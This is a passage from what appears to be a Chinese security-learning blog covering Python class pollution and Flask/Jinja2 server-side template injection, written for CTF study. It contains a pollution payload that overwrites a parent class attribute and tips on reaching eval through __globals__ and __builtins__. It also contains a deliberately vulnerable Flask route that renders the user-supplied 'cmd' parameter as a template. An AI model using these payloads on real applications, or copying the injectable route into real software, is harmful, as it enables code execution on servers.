</span><br><span class="line">    <span class="keyword">pass</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Chu0</span>(<span class="title class_ inherited__">ctfer</span>):  </span><br><span class="line">    <span class="keyword">pass</span>  </span><br><span class="line"></span><br><span class="line">ctf1 = Delete()  </span><br><span class="line">ctf2 = Chu0()  </span><br><span class="line">evil_playload = &#123;  </span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>:  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="string">&quot;__base__&quot;</span>:  </span><br><span class="line">        &#123;  </span><br><span class="line">            <span class="string">&quot;flag&quot;</span>: <span class="string">&quot;flag&#123;really_flag&#125;&quot;</span>  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(ctf1.flag)  </span><br><span class="line"><span class="built_in">print</span>(ctf2.flag)  </span><br><span class="line">merge(evil_playload, ctf1)  </span><br><span class="line"><span class="built_in">print</span>(ctf1.flag)  </span><br><span class="line"><span class="built_in">print</span>(ctf2.flag)</span><br></pre></td></tr></table></figure><h3 id="payload解析"><a href="#payload解析" class="headerlink" title="payload解析"></a>payload解析</h3><ol><li><code>__class__</code> 是Python中每个对象都具有的一个属性，它指向对象的类(对象)</li><li><code>__base__</code> 是Python类对象的一个属性，指向当前类的父类</li><li>这里通过payload来覆盖&#x2F;增加类对象的变量</li></ol><h3 id="merge的局限性"><a href="#merge的局限性" class="headerlink" title="merge的局限性"></a>merge的局限性</h3><ol><li>在代码展示部分所给出的例子中，污染类属性是通过示例的__base__属性查找到其继承的父类，但是如果<em><strong>目标类与切入点类或实例没有继承关系时</strong></em>，这种方法就显得十分无力，无法污染到共同的类对象(object没办法)</li></ol><h2 id="python原型链污染绕过一些限制"><a href="#python原型链污染绕过一些限制" class="headerlink" title="python原型链污染绕过一些限制"></a>python原型链污染绕过一些限制</h2><h3 id="污染全局变量"><a href="#污染全局变量" class="headerlink" title="*污染全局变量"></a>*污染全局变量</h3><h4 id="python的内置变量和魔术方法"><a href="#python的内置变量和魔术方法" class="headerlink" title="*python的内置变量和魔术方法"></a>*python的内置变量和魔术方法</h4><ol><li><p>常见内置变量和魔术方法</p><ol><li>内置变量在原型链污染中比较常见</li><li><em><strong>一、关于<code>__init__</code>的注意点</strong></em><ol><li>在python中，对于类的内置方法如<code>__init__</code>这些来说，内置方法在并未重写时其数据类型为装饰器即wrapper_descriptor，只有在重写后才是函数function，<strong>普通函数对象拥有<code>__globals__</code>属性</strong>，这也就解释了为什么在SSTI中不是每一个类的<code>__init__</code>都有<code>__globals__</code>属性</li><li>重写这些方法时，你实际上是在定义一个新的普通函数，并将其绑定到类的相应方法名上</li></ol></li><li><em><strong>二、关于<code>__builtins__</code></strong></em><ol><li><p>这是一个特殊的<strong>模块</strong>，包含了 Python 解释器提供的所有内置函数、异常和其他对象</p></li><li><p><strong>默认导入</strong>: 每个 Python 程序中都是默认可用的该模块的，因此你可以在任何地方直接使用这些内置对象，而不需要显式导入</p>   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 包含了常用的内置函数，如 print、len、type、int、str、list、dict 等。</span></span><br><span class="line"><span class="comment"># 2. 包含了所有标准异常，如 ValueError、TypeError、IndexError 等。</span></span><br><span class="line"><span class="comment"># 3. 包含了一些内置常量，如 True、False、None等</span></span><br></pre></td></tr></table></figure></li><li><p><strong>作用</strong>: 由于 eval 是一个内置函数，我们不能直接通过 <code>__globals__[&#39;eval&#39;]</code> 来访问它，但可以通过 <code>__builtins__</code> 来访问</p><ol><li><strong>REASON: Python的命名空间和作用域</strong></li></ol></li></ol></li><li><em><strong>三、关于<code>__import__</code>注意点</strong></em><ol><li>这是一个内置函数，用于动态导入模块。尽管通常我们使用 import 语句来导入模块，但<code>__import__</code>提供了一种更灵活的方式来动态地导入模块，特别是在模块名称是动态确定的情况下</li><li><code>__import__(name, globals=None, locals=None, fromlist=(), level=0)</code>函数原型</li></ol></li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__name___ <span class="comment"># 1. 当前模块的名称。如果是主模块（即直接运行的脚本），则 __name__ 的值为 &#x27;__main__&#x27; </span></span><br><span class="line"></span><br><span class="line">__file__ <span class="comment"># 2. 表示当前模块的文件路径</span></span><br><span class="line"></span><br><span class="line">__dict__ <span class="comment"># 3. 表示对象的属性字典</span></span><br><span class="line"></span><br><span class="line">__module__ <span class="comment"># 4. 表示类或函数所属的模块名称</span></span><br><span class="line"></span><br><span class="line">__globals__ <span class="comment"># 5. 与函数和方法对象相关联，全局信息存在字典里，只读字典</span></span><br><span class="line">   <span class="comment"># ref: https://docs.python.org/3/reference/datamodel.html</span></span><br><span class="line"></span><br><span class="line">__init__ <span class="comment"># 6. 初始化类，返回的类型是function</span></span><br><span class="line">    <span class="comment"># 关于.__init__.__globals__实际上是通过函数访问全局变量而不是初始化实例</span></span><br><span class="line"></span><br><span class="line">__builtins__ <span class="comment"># 7. 内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__import__</span> <span class="comment"># 8. 内置方法: 动态导入模块</span></span><br><span class="line">    <span class="comment"># 调用示例</span></span><br><span class="line">    odule_name = <span class="string">&#x27;os&#x27;</span></span><br><span class="line">    os_module = <span class="built_in">__import__</span>(module_name)</span><br><span class="line">    <span class="built_in">print</span>(os_module.getcwd())  <span class="comment"># 输出当前工作目录</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="python命名空间和作用域"><a href="#python命名空间和作用域" class="headerlink" title="python命名空间和作用域"></a>python命名空间和作用域</h4><ol><li><em><strong>全局命名空间 (<code>__globals__</code>)</strong></em><ol><li>包含函数或模块的全局变量和对象。</li><li>例如，你在模块中定义的变量、函数、类等都存储在全局命名空间中。</li></ol></li><li><em><strong>内置命名空间 (<code>__builtins__</code>)</strong></em><ol><li>包含所有内置函数和对象，如 print、len、eval 等。</li><li>这些内置对象在每个 Python 程序中都是默认可用的，但它们并不直接存储在全局命名空间中</li></ol></li><li>Q: 为什么在ssti(串台一下)中为什么 <code>__globals__[&#39;eval&#39;]</code> 会失败?<ol><li>A: eval 是一个内置函数，它存储在 <code>__builtins__</code> 模块中，而不是直接存储在全局命名空间中。</li></ol></li><li><em><strong>Solution<code>.__globals__.__builtins__[&#39;eval&#39;]</code></strong></em>: 通过 <code>__globals__[&#39;__builtins__&#39;]</code> 访问 <code>__builtins__</code> 模块，然后从中获取 eval 函数</li></ol><h4 id="globals-与payloads"><a href="#globals-与payloads" class="headerlink" title="__globals__与payloads"></a><code>__globals__</code>与payloads</h4><blockquote><p><code>__globals__</code>中具有的是当前模块的全局变量: 当前全局命名空间中的符号表（symbol table），这个符号表包含了当前模块（即当前文件）中的所有全局变量、函数、类等定义，<strong>每个模块的全局命名空间是独立的，互不影响</strong><br><code>__dict__</code>每个模块对象都有一个该属性，它是一个字典，包含了模块的全局命名空间</p></blockquote><ol><li>在Python中，函数或类方法均具有一个<code>__globals__</code>属性，该属性将函数或类方法所申明的变量空间中的全局变量以字典的形式返回(相当于这个变量空间中的globals()函数的返回值)</li><li><em><strong>利用payload</strong></em></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="简单加载模块"><a href="#简单加载模块" class="headerlink" title="简单加载模块"></a>简单加载模块</h3><h3 id="复杂加载模块"><a href="#复杂加载模块" class="headerlink" title="复杂加载模块"></a>复杂加载模块</h3><h2 id="原型链污染衍生手法兼思想"><a href="#原型链污染衍生手法兼思想" class="headerlink" title="原型链污染衍生手法兼思想"></a>原型链污染衍生手法兼思想</h2><h3 id="函数默认参数"><a href="#函数默认参数" class="headerlink" title="函数默认参数"></a>函数默认参数</h3><h3 id="特定值替换"><a href="#特定值替换" class="headerlink" title="特定值替换"></a>特定值替换</h3><h3 id="结合jinja2-ssti"><a href="#结合jinja2-ssti" class="headerlink" title="结合jinja2 ssti"></a>结合jinja2 ssti</h3><blockquote><p>这一部分的内容见《从原型链深入理解flask的ssti》</p></blockquote><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>看下来真实醍醐灌顶，思路打开脑洞，pp+ssti部分见《从原型链深入理解flask的ssti》<a href="https://tttang.com/archive/1876/">一把梭</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Python安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask_ssti</title>
      <link href="/2024/11/11/flask_ssti/"/>
      <url>/2024/11/11/flask_ssti/</url>
      
        <content type="html"><![CDATA[<blockquote><p>去年11.4号就有学过，一年没学又给忘记了</p></blockquote><h2 id="Python前置知识"><a href="#Python前置知识" class="headerlink" title="Python前置知识"></a>Python前置知识</h2><h3 id="使用"><a href="#使用" class="headerlink" title=".使用"></a><code>.</code>使用</h3><ol><li>属性访问：使用点号可以访问对象的属性和方法。<ol><li>例如，object.property 可以获取对象的属性值，</li><li>object.method() 可以调用对象的方法。</li></ol></li><li>模块导入：使用点号可以导入模块中的子模块、变量、函数或类<ol><li>例如，import module.submodule 可以导入模块的子模块，</li><li>from module import function 可以导入模块中的函数。</li></ol></li><li>类成员访问：在类定义中，使用点号可以访问类的静态变量、类方法或类属性。<ol><li>例如，ClassName.static_variable 可以访问类的静态变量，</li><li>ClassName.class_method() 可以调用类的方法。</li></ol></li><li>字典键访问：在字典中，使用点号可以通过键来访问相应的值<ol><li>例如 dictionary.key 可以获取字典中键对应的值</li><li>但是元组不可以</li></ol></li></ol><h3 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h3><ol><li><p>tuple元组: 不可变(值不可以杯修改、添加和删除)，类似数组</p><ol><li><strong>对于可变对象</strong>: 如果元组中包含可变对象（如列表），则可以在可变对象中修改其值</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tuple5 = ([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], <span class="string">&#x27;apple&#x27;</span>)</span><br><span class="line">tuple5[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">5</span>  <span class="comment">#用[]可以多次选定</span></span><br><span class="line"><span class="built_in">print</span>(tuple5)    <span class="comment"># 输出：([5, 2, 3], &#x27;apple&#x27;)</span></span><br></pre></td></tr></table></figure></li><li><p>list列表: 可改变的tuple，也使用索引访问元素</p><ol><li><code>list.remove(...)</code>和<code>list.append(...)</code>，支持切片操作</li></ol></li><li><p>dict字典: 每个键值对之间使用冒号 : 分隔，键和值之间使用逗号 , 分隔。<strong>键必须是不可变的类型</strong>（如字符串（<strong>python中的字符串是不可变的</strong>、整数、浮点数或元组），而值可以是任意类型，使用<code>[]</code>或者<code>.</code>来访问元素</p></li></ol><h3 id="模块和包"><a href="#模块和包" class="headerlink" title="模块和包"></a>模块和包</h3><ol><li>python文件就是一个python模块，也可以是内置的模块，可以<strong>从中导入函数和变量</strong></li><li>通过目录结构+<code>__init__.py</code>(3.3之后不需要)可以创建包来提供命名空间并进行组织</li><li>类似于cpp中的库文件</li></ol><h3 id="特殊变量和魔术方法"><a href="#特殊变量和魔术方法" class="headerlink" title="*特殊变量和魔术方法"></a>*特殊变量和魔术方法</h3><h3 id="元类"><a href="#元类" class="headerlink" title="元类"></a>元类</h3><h4 id="明确目标"><a href="#明确目标" class="headerlink" title="明确目标"></a>明确目标</h4><blockquote><p>可以先见《Python原型链污染》这篇博客<br>这一章就为了理解这一句话: <em><strong>在 Python 中，object 是所有类的基类，而 type 是所有类的元类</strong></em></p></blockquote><h4 id="什么是元类"><a href="#什么是元类" class="headerlink" title="什么是元类"></a>什么是元类</h4><ol><li><p>元类（Metaclass）是类的类。它负责创建类对象。</p><ol><li>在 Python 中，类本身也是对象，这些对象是由元类创建的。</li><li><strong>默认情况下，所有类都是由 type 元类创建的</strong></li><li>作用：元类（Metaclass）是类的类。它负责创建类对象。在 Python 中，类本身也是对象，这些对象是由元类创建的。</li></ol></li><li><p>自定义元类：元类通常通过继承 type 类来定义，并重写其 <code>__new__</code>或 <code>__init__</code> 方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyMeta</span>(<span class="title class_ inherited__">type</span>):</span><br><span class="line">   </span><br><span class="line">   <span class="comment"># new在创建类的时候调用(定义后运行py文件后)，而不是在创建实例的时候调用</span></span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls, name, bases, dct</span>):</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">f&quot;Creating class <span class="subst">&#123;name&#125;</span> with metaclass <span class="subst">&#123;cls&#125;</span>&quot;</span>)</span><br><span class="line">       <span class="comment"># dct是类的属性字典，添加到类的属性中(static)</span></span><br><span class="line">       dct[<span class="string">&#x27;custom_attribute&#x27;</span>] = <span class="string">&quot;This is a custom attribute&quot;</span></span><br><span class="line">       <span class="keyword">return</span> <span class="built_in">super</span>().__new__(cls, name, bases, dct)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>(metaclass=MyMeta):</span><br><span class="line">   <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">obj = MyClass()</span><br><span class="line"><span class="built_in">print</span>(obj.custom_attribute)</span><br><span class="line"><span class="comment"># 输出: This is a custom attribute</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="type与object"><a href="#type与object" class="headerlink" title="type与object"></a>type与object</h4><ol><li><p>object 类</p><ol><li>用途：object 是所有类的基类。每个类（无论是用户定义的类还是内置类）都隐式或显式地继承自 object。</li><li>特点：<ol><li>所有对象都是 object 的实例</li><li>object 提供了一些基本的方法，如 <code>__str__</code>、<code>__repr__</code></li></ol></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># MyClass 继承自 object</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">issubclass</span>(MyClass, <span class="built_in">object</span>))  <span class="comment"># 输出: True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># MyClass 的实例也是 object 的实例</span></span><br><span class="line">obj = MyClass()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>(obj, <span class="built_in">object</span>))  <span class="comment"># 输出: True</span></span><br></pre></td></tr></table></figure></li><li><p>type 元类</p><ol><li>用途：type 是所有类的元类。元类是类的类，负责创建类。</li><li>特点：<ol><li>所有类都是 type 的实例。</li><li><strong>type 本身也是一个类，同时也是一个元类</strong></li></ol></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># MyClass 是 type 的实例</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>(MyClass, <span class="built_in">type</span>))  <span class="comment"># 输出: True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># type 本身也是一个类</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="built_in">type</span>))  <span class="comment"># 输出: &lt;class &#x27;type&#x27;&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>二者的关系: 循环引用</p><ol><li>object 是 type 的实例：<ol><li>object 本身是一个类，它是 type 的实例。</li></ol></li><li>type 是 object 的子类：<ol><li>type 继承自 object，因此 type 也是 object 的实例</li></ol></li><li><strong>实现方面</strong><ol><li>type 先于 object 存在：</li><li>在 Python 的启动过程中，首先创建 type 类。</li><li>然后使用 type 类来创建 object 类。</li></ol></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">                      <span class="comment"># 直接父类</span></span><br><span class="line">+-------------------+ ----------&gt; +-------------------+</span><br><span class="line">|      <span class="built_in">object</span>       |             |       <span class="built_in">type</span>        |</span><br><span class="line">+-------------------+ &lt;---------- +-------------------+</span><br><span class="line">          |            <span class="comment"># 创建类实例</span></span><br><span class="line">          v</span><br><span class="line">+-------------------+</span><br><span class="line">|     MyClass       |</span><br><span class="line">+-------------------+</span><br><span class="line">          |</span><br><span class="line">          v</span><br><span class="line">+-------------------+</span><br><span class="line">|       obj         |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure></li></ol><h3 id="Python访问控制"><a href="#Python访问控制" class="headerlink" title="Python访问控制"></a>Python访问控制</h3><ol><li>Python 通过命名约定来实现访问控制，而不是像其他语言（如 Java 或 C++）那样通过严格的关键字（如 private 或 protected）来实现<ol><li>公有（Public）:成员名称没有任何前缀，可以在类的外部直接访问，比如<code>self.public_attribute</code></li><li>保护（Protected）:成员名称以单下划线 _ 开头，这是一种约定，表示该成员仅供类内部或子类使用，外部不应直接访问；比如<code>self._protected_attribute</code></li><li>私有（Private）:成员名称以双下划线 __ 开头，Python 会对名称进行名称修饰（name mangling），使其在类外部难以直接访问；示比如<code>self.__private_attribute</code></li></ol></li><li><strong>并不安全</strong>: Python 的访问控制并非绝对安全，私有成员仍然可以通过名称修饰访问，保护成员和私有成员<strong>更多是一种约定</strong>，依赖于开发者的自觉</li></ol><h2 id="什么是模板？"><a href="#什么是模板？" class="headerlink" title="什么是模板？"></a>什么是模板？</h2><h3 id="模板工作流"><a href="#模板工作流" class="headerlink" title="*模板工作流"></a>*模板工作流</h3><ol><li><p><em><strong>模板引擎</strong></em>:(这里特指用于Web开发的模板引擎)是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，<strong>利用模板引擎来生成前端的html代码</strong>，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。  </p><ol><li>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用<strong>沙箱逃逸技术</strong>来进行绕过。</li></ol></li><li><p><em><strong>漏洞成因</strong></em>:服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性 –&gt; <strong>在模板渲染的时候进行了解析操作，支持代码的执行</strong></p><ol><li><img src="/pic/Flask_ssti/flask_ssti_flow.png" alt="Flow"></li><li>如果使用固定了的模板，渲染后传入数据，就不存在模板注入了，比如一下的flask jinja2就不会模板注入</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 预防模板注入</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">   name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line"></span><br><span class="line">   t = Template(<span class="string">&quot;Hello &#123;&#123;n&#125;&#125;&quot;</span>)</span><br><span class="line">   <span class="keyword">return</span> t.render(n=name)</span><br><span class="line">   <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">   此处会将name整个值保留下来而不是直接当作&#123;&#123;&#125;&#125;</span></span><br><span class="line"><span class="string">   所以避免了直接执行的问题，其实就是把&#123;&#123;&#125;&#125;先给你写好了</span></span><br><span class="line"><span class="string">   &quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure></li></ol><h3 id="常见模板引擎及其变量语法"><a href="#常见模板引擎及其变量语法" class="headerlink" title="常见模板引擎及其变量语法"></a>常见模板引擎及其变量语法</h3><p><img src="/pic/Flask_ssti/ssti_%E5%A4%A7%E5%85%A8.png" alt="ssti大全"></p><h3 id="类型判断图例"><a href="#类型判断图例" class="headerlink" title="类型判断图例"></a>类型判断图例</h3><p><img src="/pic/Flask_ssti/ssti_%E5%88%A4%E6%96%AD.png" alt="ssti_conclude"></p><h2 id="Flask-ssti"><a href="#Flask-ssti" class="headerlink" title="Flask ssti"></a>Flask ssti</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ol><li><p>S1: <code>conda install Flask</code></p></li><li><p>S2: 启动路由脚本</p><ol><li>自己添加题目脚本即可</li><li><strong>注意使用debug模式，修改实时可以查看</strong></li><li><strong>就算搭建起来的话在本地的链可能也会服务器上的不一样，留个心眼，可以在题目中测还是在题目中测好</strong></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/ssti&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ssti</span>():</span><br><span class="line">    cmd = request.args.get(<span class="string">&quot;cmd&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> cmd:</span><br><span class="line">       <span class="keyword">return</span> render_template_string(cmd)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;input to ssti&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># app.run(port=5000, debug=True)</span></span><br><span class="line">    app.run(port=<span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h3 id="Jinja2基础"><a href="#Jinja2基础" class="headerlink" title="Jinja2基础"></a>Jinja2基础</h3><blockquote><p>Flask是一个使用Python编写的轻量级web应用框架，其WSGI工具箱采用Werkzeug，模板引擎默认使用Jinja2</p></blockquote><ol><li><p>Jinja2是一种面向Python的现代和设计友好的模板语言，它是以Django的模板为模型的；Jinja2是<strong>Flask框架的一部分</strong>。Jinja2会把模板参数提供的相应的值替换了  块</p><ol><li><p>变量<code>&#123;&#123;&#125;&#125;</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The value is &#123;&#123; value &#125;&#125;.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>控制语句<code>&#123;%%&#125;</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--条件语句--&gt;</span></span><br><span class="line">&#123;% if user.is_admin %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Welcome, Admin!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&#123;% elif user.is_member %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Welcome, Member!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Welcome, Guest!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--循环语句--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">   &#123;% for item in items %&#125;</span><br><span class="line">       <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123; item &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">   &#123;% endfor %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>宏，类似于函数，也是<code>&#123;%%&#125;</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;% macro input(name, value=&#x27;&#x27;, type=&#x27;text&#x27;, size=20) %&#125;</span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;&#123;&#123; type &#125;&#125;&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&#123;&#123; name &#125;&#125;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;&#123; value|e &#125;&#125;&quot;</span> <span class="attr">size</span>=<span class="string">&quot;&#123;&#123; size &#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">&#123;% endmacro %&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">   &#123;&#123; input(&#x27;username&#x27;) &#125;&#125;</span><br><span class="line">   &#123;&#123; input(&#x27;email&#x27;, type=&#x27;email&#x27;) &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>注释&#96;&#96;，并不会被渲染出来</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;# This is a comment #&#125;</span><br></pre></td></tr></table></figure></li><li><p>内置过滤器这里不进行讨论</p></li></ol></li><li><p>模板渲染示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span 